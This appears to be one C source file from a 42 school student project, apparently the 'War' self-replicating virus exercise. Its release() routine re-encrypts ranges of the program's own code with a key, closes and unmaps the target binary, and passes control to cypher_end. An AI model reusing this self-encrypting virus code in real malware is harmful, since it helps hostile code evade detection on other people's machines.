/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   release.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/12 18:22:50 by ddinaut           #+#    #+#             */
/*   Updated: 2019/03/20 19:42:21 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

void		release(t_data *data)
{
	revert_one(&data->key, (char*)inject, (size_t)release - (size_t)inject);
	update_one(&data->key, (char*)release, (size_t)cypher_end - (size_t)release);

	if (data->context == true || data->context == false)
	{
		close(data->bin.fd);
		munmap(data->bin.map, data->bin.size);
	}
	revert_one(&data->key, (char*)cypher_end, (size_t)end - (size_t)release);
	cypher_end(data);
}
